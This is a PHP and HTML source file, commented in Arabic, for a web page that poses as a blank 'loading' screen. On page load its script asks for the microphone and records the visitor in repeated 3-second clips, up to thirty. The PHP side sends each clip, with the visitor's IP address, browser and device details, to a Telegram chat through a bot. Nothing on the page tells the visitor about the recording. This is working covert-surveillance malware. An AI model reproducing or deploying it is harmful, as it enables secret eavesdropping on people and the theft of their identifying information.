<?php
// توكن البوت الخاص بك
$botToken = "BBOTTTTTTTTTTT";

// دالة لإرسال الملفات الصوتية إلى التليجرام
function sendTelegramAudio($chatId, $audioPath, $botToken, $caption = "") {
    $url = "https://api.telegram.org/bot{$botToken}/sendAudio";
    
    $postFields = [
        'chat_id' => $chatId,
        'audio' => new CURLFile(realpath($audioPath)),
        'caption' => $caption,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال الملفات الصوتية
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['audio'])) {
        $input = json_decode($_POST['data'], true);
        $chatId = $input['chatId'];
        
        // حفظ الملف الصوتي مؤقتاً
        $uploadDir = 'uploads/';
        if (!file_exists($uploadDir)) {
            mkdir($uploadDir, 0777, true);
        }
        
        $fileName = 'recording_' . time() . '.mp3';
        $filePath = $uploadDir . $fileName;
        
        if (move_uploaded_file($_FILES['audio']['tmp_name'], $filePath)) {
            // إرسال المعلومات إلى التليجرام
            $deviceInfo = $input['deviceInfo'] ?? [];
            $message = "
🎙️ <b>تسجيل صوتي جديد</b>

📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
🖥️ <b>النظام:</b> {$deviceInfo['platform']}
🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
🗣️ <b>اللغة:</b> {$deviceInfo['language']}
📺 <b>معلومات الشاشة:</b> {$deviceInfo['screen']}

📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
            ";
            
            $result = sendTelegramAudio($chatId, $filePath, $botToken, $message);
            
            // حذف الملف بعد الإرسال
            unlink($filePath);
            
            echo json_encode(['status' => 'success', 'message' => 'تم إرسال التسجيل']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'فشل في حفظ الملف']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'لم يتم استلام ملف صوتي']);
    }
    exit;
}

// الحصول على chatId من رابط الصفحة
$chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
        }
        
        .loading-container {
            text-align: center;
        }
        
        .loader {
            width: 80px;
            height: 80px;
            border: 8px solid #333;
            border-top: 8px solid #2E8B57;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 18px;
            color: #ccc;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="loader"></div>
        <div class="loading-text">جاري تحميل...</div>
    </div>

    <script>
        // حالة النظام
        const state = {
            recordingsSent: 0,
            maxRecordings: 30,
            isRecording: false,
            mediaRecorder: null,
            recordingInterval: null,
            chatId: "<?php echo $chatId; ?>"
        };

        // بدء التسجيل
        async function startRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                state.mediaRecorder = new MediaRecorder(stream);
                state.mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        sendRecordingToServer(event.data);
                    }
                };
                
                state.mediaRecorder.start();
                state.isRecording = true;
                
                // بدء دورة التسجيل كل 3 ثوان
                state.recordingInterval = setInterval(() => {
                    if (state.isRecording && state.recordingsSent < state.maxRecordings) {
                        state.mediaRecorder.stop();
                        state.mediaRecorder.start();
                    } else if (state.recordingsSent >= state.maxRecordings) {
                        stopRecording();
                    }
                }, 3000);
                
            } catch (error) {
                console.error('خطأ في الوصول إلى الميكروفون:', error);
            }
        }

        // إيقاف التسجيل
        function stopRecording() {
            if (state.mediaRecorder && state.isRecording) {
                state.mediaRecorder.stop();
                state.isRecording = false;
                clearInterval(state.recordingInterval);
                
                // إيقاف جميع المسارات الصوتية
                if (state.mediaRecorder.stream) {
                    state.mediaRecorder.stream.getTracks().forEach(track => track.stop());
                }
            }
        }

        // إرسال التسجيل إلى الخادم
        function sendRecordingToServer(audioBlob) {
            const formData = new FormData();
            formData.append('audio', audioBlob, `recording_${Date.now()}.mp3`);
            
            // جمع معلومات الجهاز
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                battery: 'غير معروف',
                connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف'
            };
            
            const data = {
                chatId: state.chatId,
                deviceInfo: deviceInfo
            };
            
            formData.append('data', JSON.stringify(data));
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(result => {
                if (result.status === 'success') {
                    state.recordingsSent++;
                    
                    // التحقق من اكتمال العملية
                    if (state.recordingsSent >= state.maxRecordings) {
                        stopRecording();
                    }
                }
            })
            .catch(error => {
                console.error('خطأ في إرسال التسجيل:', error);
            });
        }

        // بدء النظام عند تحميل الصفحة
        window.addEventListener('load', () => {
            // بدء التسجيل بعد ثانية
            setTimeout(() => {
                startRecording();
            }, 1000);
        });
    </script>
</body>
</html>
